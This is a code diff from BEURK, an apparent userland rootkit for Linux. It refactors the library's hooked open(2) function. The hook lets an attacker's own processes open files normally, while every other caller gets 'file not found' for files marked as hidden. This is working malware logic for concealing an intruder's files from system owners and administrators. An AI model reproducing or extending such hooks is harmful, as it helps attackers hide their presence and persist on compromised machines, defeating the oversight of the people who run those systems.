@@ -18,16 +18,14 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-/**
- * includes open
-*/
-
 #include <stdarg.h> /* va_list, va_start(), va_args(), va_end() */
 #include <fcntl.h> /* O_CREAT */
 #include <sys/stat.h> /* mode_t */
 #include <string.h> /* strstr() */
 #include <errno.h> /* errno, ENOENT */
-#include "beurk.h"
+#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_OPEN() */
+#include "hooks.h" /* prototype */
 
 int open(const char *pathname, int flag, ...) {
     DEBUG(D_INFO, "called open(2) hook");
@@ -39,19 +37,22 @@ int open(const char *pathname, int flag, ...) {
         va_start(args, flag);
         mode = (mode_t)va_arg(args, int);
         va_end(args);
-        if (is_attacker()) {
+
+        if (is_attacker())
             return REAL_OPEN(pathname, flag, mode);
-        }
-        if (strstr(pathname, MAGIC_STRING)) {
+
+        if (is_hidden_file(pathname)) {
             errno = ENOENT;
             return (-1);
         }
+
         return REAL_OPEN(pathname, flag, mode);
     }
-    if (is_attacker()) {
+
+    if (is_attacker())
         return REAL_OPEN(pathname, flag);
-    }
-    if (strstr(pathname, MAGIC_STRING)) {
+
+    if (is_hidden_file(pathname)) {
         errno = ENOENT;
         return (-1);
     }
